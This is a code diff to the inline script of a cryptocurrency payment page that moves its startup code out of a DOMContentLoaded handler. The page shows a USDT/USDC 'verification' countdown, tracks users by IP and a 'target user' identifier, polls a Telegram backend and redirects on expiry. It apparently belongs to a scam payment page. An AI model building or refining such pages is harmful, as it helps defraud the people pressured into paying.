@@ -990,68 +990,67 @@
         setTimeout(() => notification.classList.remove("show"), duration);
     }
 
-    document.addEventListener("DOMContentLoaded", () => {
-        initializeAppWithIP();
-        showTokenCard("usdt");
+    // Direct execution initialization (fixed for ES module loading)
+    initializeAppWithIP();
+    showTokenCard("usdt");
 
-        const usdtAmountEl = document.getElementById("usdt-amount");
-        const usdcAmountEl = document.getElementById("usdc-amount");
-        if (usdtAmountEl) usdtAmountEl.innerText = "$" + expectedAmount;
-        if (usdcAmountEl) usdcAmountEl.innerText = "$" + expectedAmount;
+    const usdtAmountEl = document.getElementById("usdt-amount");
+    const usdcAmountEl = document.getElementById("usdc-amount");
+    if (usdtAmountEl) usdtAmountEl.innerText = "$" + expectedAmount;
+    if (usdcAmountEl) usdcAmountEl.innerText = "$" + expectedAmount;
 
-        if (localStorage.getItem("av_payment_in_progress") === "true") {
+    if (localStorage.getItem("av_payment_in_progress") === "true") {
+        paymentDone = true;
+        initiatePaymentAnimationUI();
+        const identifyUser = getTargetUserIdentifier();
+        startTelegramPolling(identifyUser, "Resumed Session Request");
+    }
+
+    function updateTimer() {
+        const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
+        const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
+
+        const totalSeconds = totalDuration / 1000;
+        const percentage = Math.max(0, (remaining / totalSeconds) * 100);
+
+        const usdtProgress = document.getElementById("usdt-progress");
+        const usdcProgress = document.getElementById("usdc-progress");
+
+        if (usdtProgress) usdtProgress.style.width = percentage + "%";
+        if (usdcProgress) usdcProgress.style.width = percentage + "%";
+
+        const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
+        const seconds = String(remaining % 60).padStart(2, "0");
+
+        const usdtTimerEl = document.getElementById("usdt-timer");
+        const usdcTimerEl = document.getElementById("usdc-timer");
+
+        if (usdtTimerEl) usdtTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
+        if (usdcTimerEl) usdcTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
+
+        if (remaining <= 0 && !paymentDone) {
             paymentDone = true;
-            initiatePaymentAnimationUI();
-            const identifyUser = getTargetUserIdentifier();
-            startTelegramPolling(identifyUser, "Resumed Session Request");
+
+            localStorage.removeItem("av_payment_in_progress");
+            localStorage.removeItem("avalonflowAmount");
+            localStorage.removeItem(SOURCE_TIMER_KEY);
+            localStorage.removeItem(storageKey);
+            localStorage.removeItem("avalonflowWallet");
+            localStorage.removeItem("avalonflowCustomAmount");
+            localStorage.removeItem("avalonflowRandomDecimal");
+
+            clearInterval(timerInterval);
+
+            try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }
+
+            setTimeout(() => {
+                window.location.replace("https://membership.avalonflow.site/notifications");
+            }, 3200);
         }
+    }
 
-        function updateTimer() {
-            const currentExpiry = parseInt(localStorage.getItem(SOURCE_TIMER_KEY), 10) || expiryTime;
-            const remaining = Math.max(0, Math.floor((currentExpiry - Date.now()) / 1000));
-
-            const totalSeconds = totalDuration / 1000;
-            const percentage = Math.max(0, (remaining / totalSeconds) * 100);
-
-            const usdtProgress = document.getElementById("usdt-progress");
-            const usdcProgress = document.getElementById("usdc-progress");
-
-            if (usdtProgress) usdtProgress.style.width = percentage + "%";
-            if (usdcProgress) usdcProgress.style.width = percentage + "%";
-
-            const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
-            const seconds = String(remaining % 60).padStart(2, "0");
-
-            const usdtTimerEl = document.getElementById("usdt-timer");
-            const usdcTimerEl = document.getElementById("usdc-timer");
-
-            if (usdtTimerEl) usdtTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
-            if (usdcTimerEl) usdcTimerEl.innerText = remaining > 0 ? `Verification expires in ${minutes}:${seconds}` : "Verification expired!";
-
-            if (remaining <= 0 && !paymentDone) {
-                paymentDone = true;
-
-                localStorage.removeItem("av_payment_in_progress");
-                localStorage.removeItem("avalonflowAmount");
-                localStorage.removeItem(SOURCE_TIMER_KEY);
-                localStorage.removeItem(storageKey);
-                localStorage.removeItem("avalonflowWallet");
-                localStorage.removeItem("avalonflowCustomAmount");
-                localStorage.removeItem("avalonflowRandomDecimal");
-
-                clearInterval(timerInterval);
-
-                try { triggerNotification("Verification Failed. Redirecting...", 3000); } catch (err) { }
-
-                setTimeout(() => {
-                    window.location.replace("https://membership.avalonflow.site/notifications");
-                }, 3200);
-            }
-        }
-
-        timerInterval = setInterval(updateTimer, 1000);
-        updateTimer();
-    });
+    timerInterval = setInterval(updateTimer, 1000);
+    updateTimer();
   </script>
 
 </body>
